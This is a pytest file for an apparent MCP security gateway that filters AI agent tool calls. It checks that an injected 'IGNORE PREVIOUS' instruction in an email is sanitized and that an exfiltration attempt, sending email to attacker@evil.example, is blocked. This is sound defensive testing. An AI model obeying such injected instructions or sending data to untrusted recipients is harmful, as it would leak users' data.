"""MCP proxy: in-process server, streamable-HTTP endpoint, remote (stdio) proxy."""

from __future__ import annotations

import json
import sys
from types import SimpleNamespace

import httpx
import httpx2
import pytest
from adapters_testkit import (
    INJECTION,
    SANITIZED_MARK,
    FakeGateway,
    FakeUpstreams,
    ToolInfo,
    make_mini_api,
    make_workspace_server,
    serve_asgi,
)
from mcp import Client, MCPError, StdioServerParameters
from mcp.client.streamable_http import streamable_http_client

from mirsad.adapters import upstreams as upstreams_mod
from mirsad.adapters.mcp_proxy import (
    build_mcp_server,
    build_remote_proxy_server,
    gateway_response_to_call_result,
    mcp_http_app,
)
from mirsad.adapters.messages import block_message, extract_agent_key, result_block_message
from mirsad.adapters.upstreams import UpstreamConfig, UpstreamManager
from mirsad.models import (
    Action,
    Decision,
    GatewayResponse,
    InspectionOutcome,
    Reason,
    Sensitivity,
    ToolResult,
    Trust,
)

AGENT = "email-crm-assistant"


@pytest.fixture
async def workspace(monkeypatch: pytest.MonkeyPatch):
    """Real UpstreamManager over an in-process MCP server whose side effects we can observe."""
    effects: list[str] = []
    server = make_workspace_server(effects)
    monkeypatch.setattr(upstreams_mod, "load_object", lambda target: server)
    mgr = UpstreamManager([UpstreamConfig(name="ws", transport="inprocess", target="test:server")])
    await mgr.start()
    yield mgr, effects
    await mgr.stop()


def text_of(result) -> str:
    return "\n".join(block.text for block in result.content)


# --------------------------------------------------------------------------- build_mcp_server (in-process)


async def test_tools_are_filtered_by_policy_and_schemas_pass_through(workspace) -> None:
    mgr, _ = workspace
    gateway = FakeGateway(visible={"read_email", "send_email"})
    async with Client(build_mcp_server(gateway, mgr, AGENT)) as client:
        tools = {t.name: t for t in (await client.list_tools()).tools}
    assert set(tools) == {"read_email", "send_email"}
    upstream = await mgr.get_tool("send_email")
    assert tools["send_email"].input_schema == upstream.input_schema
    assert tools["send_email"].description == "Send an e-mail."
    assert tools["send_email"].output_schema is None  # only inspected text is returned


async def test_allowed_call_returns_inspected_content(workspace) -> None:
    mgr, _ = workspace
    gateway = FakeGateway()
    async with Client(build_mcp_server(gateway, mgr, AGENT, session_id="sess-42")) as client:
        clean = await client.call_tool("read_email", {"email_id": "E1"})
        attacked = await client.call_tool("read_email", {"email_id": "E2"})
    assert not clean.is_error and "Quarterly figures" in text_of(clean)
    assert not attacked.is_error
    body = text_of(attacked)
    assert SANITIZED_MARK in body and "IGNORE PREVIOUS" not in body.upper()
    assert body.startswith("<<untrusted source=read_email>>")
    assert attacked.structured_content is None
    # the gateway saw the real call and the raw upstream result
    assert [c.tool for c in gateway.checked] == ["read_email", "read_email"]
    assert gateway.checked[0].agent_id == AGENT and gateway.checked[0].session_id == "sess-42"
    assert gateway.inspected[1].structured["from"] == "ops@najd-trading.example"
    assert INJECTION in gateway.inspected[1].content


async def test_denied_call_is_not_executed_and_explained(workspace) -> None:
    mgr, effects = workspace
    gateway = FakeGateway(deny={"send_email"})
    async with Client(build_mcp_server(gateway, mgr, AGENT)) as client:
        result = await client.call_tool("send_email", {"to": "attacker@evil.example", "subject": "data"})
    assert result.is_error
    text = text_of(result)
    assert effects == []  # upstream tool never ran
    assert "Tool call blocked: send_email" in text
    assert "TAINT_UNTRUSTED_DESTINATION" in text
    assert "source: read_email" in text  # provenance from taint evidence
    assert "تم منع استدعاء الأداة" in text and "جاء من محتوى غير موثوق" in text
    assert "TOOL_RISK" not in text  # informational reasons are not listed


async def test_human_denied_and_blocked_results(workspace) -> None:
    mgr, effects = workspace
    gateway = FakeGateway(human_denied={"send_email"}, block_results={"read_email"})
    async with Client(build_mcp_server(gateway, mgr, AGENT)) as client:
        denied = await client.call_tool("send_email", {"to": "ali@najd-trading.example", "subject": "hi"})
        blocked = await client.call_tool("read_email", {"email_id": "E2"})
    assert denied.is_error and "human approver denied" in text_of(denied)
    assert "رفض المعتمِد البشري" in text_of(denied)
    assert effects == []
    assert blocked.is_error and "blocked tool output" in text_of(blocked)


async def test_upstream_errors_and_gateway_failures_fail_closed() -> None:
    tools = [ToolInfo("send_email"), ToolInfo("crashy"), ToolInfo("flaky")]
    ups = FakeUpstreams(
        tools,
        results={
            "crashy": RuntimeError("executor exploded"),
            "flaky": ToolResult(
                call_id="x", session_id="x", agent_id=AGENT, tool="flaky", content="404", is_error=True
            ),
        },
    )
    async with Client(build_mcp_server(FakeGateway(), ups, AGENT)) as client:
        crashed = await client.call_tool("crashy", {})
        flaky = await client.call_tool("flaky", {})
    assert crashed.is_error and "failed to run: executor exploded" in text_of(crashed)
    assert flaky.is_error and text_of(flaky) == "404"  # upstream isError is preserved

    async with Client(build_mcp_server(FakeGateway(fail_check=True), ups, AGENT)) as client:
        result = await client.call_tool("send_email", {"to": "x@najd-trading.example"})
    assert result.is_error and "could not verify" in text_of(result)
    assert [c.tool for c in ups.executed] == ["crashy", "flaky"]


async def test_visible_tools_failure_exposes_nothing() -> None:
    gateway = FakeGateway()

    def boom(agent_id, tools):
        raise RuntimeError("policy engine down")

    gateway.policy.visible_tools = boom
    async with Client(build_mcp_server(gateway, FakeUpstreams([ToolInfo("send_email")]), AGENT)) as client:
        assert (await client.list_tools()).tools == []


def test_gateway_response_rendering_edge_cases() -> None:
    allow = Decision(call_id="c1", action=Action.ALLOW)
    missing = gateway_response_to_call_result(GatewayResponse(decision=allow), "t")
    assert missing.is_error and "could not verify" in missing.content[0].text
    outcome = InspectionOutcome(
        call_id="c1", action="block", content="", trust=Trust.UNTRUSTED, sensitivity=Sensitivity.INTERNAL
    )
    blocked = gateway_response_to_call_result(GatewayResponse(decision=allow, result=outcome), "fetch_url")
    assert blocked.is_error and "withheld" in blocked.content[0].text


def test_block_message_formats() -> None:
    bare = Decision(call_id="c9", action=Action.DENY)
    text = block_message(bare, "delete_customer")
    assert "does not allow" in text and "لا تسمح" in text
    long_reason = Reason(layer="policy", code="RULE_MATCH", message="x" * 1000, action=Action.DENY)
    clipped = block_message(Decision(call_id="c9", action=Action.DENY, reasons=[long_reason]), "t")
    assert "x" * 400 not in clipped  # attacker-controlled text is never echoed at length
    expired = Decision(call_id="c9", action=Action.DENY, approval_status="expired")
    assert "expired" in block_message(expired, "t")
    outcome = InspectionOutcome(
        call_id="c1",
        action="block",
        content="",
        trust=Trust.UNTRUSTED,
        sensitivity=Sensitivity.INTERNAL,
        reasons=[Reason(layer="detector", code="INJECTION", message="m", message_ar="ر", action=Action.DENY)],
    )
    assert "[detector/INJECTION]" in result_block_message(outcome, "read_document")


def test_extract_agent_key_variants() -> None:
    assert extract_agent_key({"authorization": "Bearer mk_abc"}) == "mk_abc"
    assert extract_agent_key({"authorization": "bearer  mk_abc "}) == "mk_abc"
    assert extract_agent_key({"x-mirsad-key": "mk_x"}) == "mk_x"
    assert extract_agent_key({"authorization": "Basic Zm9v"}) is None
    assert extract_agent_key({}) is None


# --------------------------------------------------------------------------- streamable HTTP endpoint

AGENTS = {
    "mk_email_key": SimpleNamespace(id="agent-email", name="Email bot", policy_agent_id=AGENT),
    "mk_reader_key": SimpleNamespace(id="agent-reader", name="Reader", policy_agent_id="readonly-bot"),
}


def fake_authenticate(db, key: str):
    assert db == "db-handle"
    return AGENTS.get(key)


def http_app_state(gateway: FakeGateway, ups) -> SimpleNamespace:
    return SimpleNamespace(db="db-handle", gateway=gateway, upstreams=ups)


async def test_http_endpoint_rejects_missing_and_invalid_keys() -> None:
    app = mcp_http_app(http_app_state(FakeGateway(), FakeUpstreams([])), authenticate=fake_authenticate)
    init = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}
    async with serve_asgi(app) as base, httpx.AsyncClient() as http:
        missing = await http.post(f"{base}/mcp", json=init)
        wrong = await http.post(f"{base}/mcp", json=init, headers={"Authorization": "Bearer mk_nope"})
        jwt_like = await http.post(f"{base}/mcp", json=init, headers={"Authorization": "Bearer eyJhbGciOi"})
    for resp in (missing, wrong, jwt_like):
        assert resp.status_code == 401
        assert resp.headers["www-authenticate"].startswith("Bearer")
        assert "detail" in resp.json()


@pytest.mark.parametrize("mode", ["auto", "legacy"])
async def test_http_endpoint_per_agent_servers(workspace, mode: str) -> None:
    mgr, effects = workspace
    gateway = FakeGateway(
        deny={"send_email"},
        per_agent={AGENT: {"read_email", "send_email"}, "readonly-bot": {"read_email"}},
    )
    app = mcp_http_app(http_app_state(gateway, mgr), authenticate=fake_authenticate)
    async with serve_asgi(app) as base:
        headers = {"Authorization": "Bearer mk_email_key", "X-Mirsad-Session": "conv-7"}
        async with httpx2.AsyncClient(headers=headers) as http:
            async with Client(streamable_http_client(f"{base}/mcp", http_client=http), mode=mode) as client:
                names = {t.name for t in (await client.list_tools()).tools}
                result = await client.call_tool("read_email", {"email_id": "E2"})
                denied = await client.call_tool("send_email", {"to": "attacker@evil.example", "subject": "x"})
        async with httpx2.AsyncClient(headers={"X-Mirsad-Key": "mk_reader_key"}) as http:
            async with Client(streamable_http_client(f"{base}/mcp", http_client=http), mode=mode) as client:
                reader_names = {t.name for t in (await client.list_tools()).tools}
                await client.call_tool("read_email", {"email_id": "E1"})
    assert names == {"read_email", "send_email"}
    assert reader_names == {"read_email"}
    assert SANITIZED_MARK in text_of(result)
    assert denied.is_error and effects == []
    first, _, third = gateway.checked
    assert (first.agent_id, first.session_id) == (AGENT, "conv-7")
    assert third.agent_id == "readonly-bot"
    assert third.session_id.startswith("mcp-")


# --------------------------------------------------------------------------- remote proxy (stdio logic)


def remote_handler(log: list[httpx.Request], *, status: int = 200, broken_json: bool = False):
    tools = [
        {
            "name": "read_email",
            "description": "Read one e-mail",
            "input_schema": {"type": "object", "properties": {"email_id": {"type": "string"}}},
            "profile": {},
        },
        {
            "name": "send_email",
            "description": "Send",
            "input_schema": {"properties": {"to": {"type": "string"}}},
            "profile": {},
        },
    ]

    def handler(request: httpx.Request) -> httpx.Response:
        log.append(request)
        if status != 200:
            return httpx.Response(status, json={"detail": "nope"})
        if request.url.path == "/v1/tools":
            return httpx.Response(200, json=tools)
        if broken_json:
            return httpx.Response(200, text="<html>")
        tool = request.url.path.split("/")[3]
        decision = Decision(call_id="c1", action=Action.ALLOW if tool == "read_email" else Action.DENY)
        result = None
        if tool == "read_email":
            result = InspectionOutcome(
                call_id="c1",
                action="sanitize",
                content=f"<<untrusted>> Hello {SANITIZED_MARK} <<end>>",
                trust=Trust.UNTRUSTED,
                sensitivity=Sensitivity.INTERNAL,
            )
        return httpx.Response(
            200, json=GatewayResponse(decision=decision, result=result).model_dump(mode="json")
        )

    return handler


async def test_remote_proxy_lists_and_invokes_over_http() -> None:
    log: list[httpx.Request] = []
    http = httpx.AsyncClient(transport=httpx.MockTransport(remote_handler(log)))
    server = build_remote_proxy_server(
        "http://mirsad.test/", "mk_secret", session_id="desk-1", http_client=http
    )
    async with Client(server) as client:
        tools = {t.name: t for t in (await client.list_tools()).tools}
        ok = await client.call_tool("read_email", {"email_id": "E2"})
        denied = await client.call_tool("send_email", {"to": "attacker@evil.example"})
    assert set(tools) == {"read_email", "send_email"}
    assert tools["send_email"].input_schema["type"] == "object"  # root type added for MCP compliance
    assert not ok.is_error and SANITIZED_MARK in text_of(ok)
    assert denied.is_error and "Tool call blocked: send_email" in text_of(denied)
    invoke = next(r for r in log if r.url.path == "/v1/tools/read_email/invoke")
    assert invoke.headers["authorization"] == "Bearer mk_secret"
    assert invoke.headers["x-mirsad-session"] == "desk-1"
    assert json.loads(invoke.content) == {"session_id": "desk-1", "arguments": {"email_id": "E2"}}
    await http.aclose()


async def test_remote_proxy_error_paths() -> None:
    def unreachable(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("connection refused", request=request)

    cases = [
        (httpx.MockTransport(unreachable), "unreachable"),
        (httpx.MockTransport(remote_handler([], status=401)), "rejected this agent key"),
        (httpx.MockTransport(remote_handler([], status=500)), "HTTP 500"),
        (httpx.MockTransport(remote_handler([], broken_json=True)), "invalid gateway response"),
    ]
    for transport, expected in cases:
        async with httpx.AsyncClient(transport=transport) as http:
            server = build_remote_proxy_server("http://mirsad.test", "mk_k", http_client=http)
            async with Client(server) as client:
                result = await client.call_tool("read_email", {"email_id": "E1"})
            assert result.is_error and expected in text_of(result), expected

    async with httpx.AsyncClient(transport=httpx.MockTransport(unreachable)) as http:
        async with Client(
            build_remote_proxy_server("http://mirsad.test", "mk_k", http_client=http)
        ) as client:
            with pytest.raises(MCPError, match="unavailable"):
                await client.list_tools()


async def test_run_stdio_proxy_end_to_end_subprocess() -> None:
    """A desktop MCP host launches `run_stdio_proxy` as a subprocess; it forwards to a live HTTP gateway."""
    gateway = FakeGateway(deny={"send_email"}, visible={"read_email", "send_email"})
    ups = FakeUpstreams(
        [ToolInfo("read_email"), ToolInfo("send_email"), ToolInfo("delete_customer")],
        results={
            "read_email": ToolResult(
                call_id="x", session_id="x", agent_id=AGENT, tool="read_email", content=f"Hi. {INJECTION}"
            )
        },
    )
    api = make_mini_api(gateway, ups, key="mk_desktop")
    async with serve_asgi(api) as base:
        script = (
            "import asyncio, sys\n"
            "from mirsad.adapters.mcp_proxy import run_stdio_proxy\n"
            "asyncio.run(run_stdio_proxy(sys.argv[1], sys.argv[2], session_id='claude-desktop'))\n"
        )
        params = StdioServerParameters(command=sys.executable, args=["-c", script, base, "mk_desktop"])
        async with Client(params, mode="legacy") as client:
            names = {t.name for t in (await client.list_tools()).tools}
            ok = await client.call_tool("read_email", {"email_id": "E2"})
            denied = await client.call_tool("send_email", {"to": "attacker@evil.example"})
    assert names == {"read_email", "send_email"}
    assert SANITIZED_MARK in text_of(ok) and not ok.is_error
    assert denied.is_error and "TAINT_UNTRUSTED_DESTINATION" in text_of(denied)
    assert [c.session_id for c in gateway.checked] == ["claude-desktop", "claude-desktop"]
    assert [c.tool for c in ups.executed] == ["read_email"]


def test_http_endpoint_survives_event_loop_change() -> None:
    from fastapi.testclient import TestClient

    app = mcp_http_app(
        http_app_state(FakeGateway(), FakeUpstreams([ToolInfo("read_email")])),
        authenticate=fake_authenticate,
        json_response=True,
    )
    init = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "initialize",
        "params": {
            "protocolVersion": "2025-06-18",
            "capabilities": {},
            "clientInfo": {"name": "t", "version": "1"},
        },
    }
    headers = {"Authorization": "Bearer mk_email_key", "Accept": "application/json, text/event-stream"}
    client = TestClient(app)  # no context manager: every request runs on a fresh event loop
    for _ in range(2):
        resp = client.post("/mcp", json=init, headers=headers)
        assert resp.status_code == 200
        assert resp.json()["result"]["serverInfo"]["name"] == "mirsad"


def test_failed_tool_returns_inspected_error_text() -> None:
    """Real Gateway.execute sets both `result` (inspected error text) and a generic `error`."""
    allow = Decision(call_id="c1", action=Action.ALLOW)
    outcome = InspectionOutcome(
        call_id="c1",
        action="pass",
        content="Upstream 'ws' rejected add: invalid params: b is required",
        trust=Trust.TRUSTED,
        sensitivity=Sensitivity.INTERNAL,
    )
    response = GatewayResponse(decision=allow, result=outcome, error="Tool 'add' returned an error.")
    rendered = gateway_response_to_call_result(response, "add")
    assert rendered.is_error
    assert rendered.content[0].text == outcome.content


async def test_http_endpoint_uses_components_auth_override() -> None:
    calls: list[str] = []

    def authenticate_agent_key(db, key):
        calls.append(key)
        return AGENTS.get(key)

    state = http_app_state(FakeGateway(), FakeUpstreams([ToolInfo("read_email")]))
    state.components = SimpleNamespace(auth=SimpleNamespace(authenticate_agent_key=authenticate_agent_key))
    app = mcp_http_app(state)
    async with serve_asgi(app) as base, httpx.AsyncClient() as http:
        resp = await http.post(f"{base}/mcp", json={}, headers={"Authorization": "Bearer mk_unknown"})
    assert resp.status_code == 401 and calls == ["mk_unknown"]
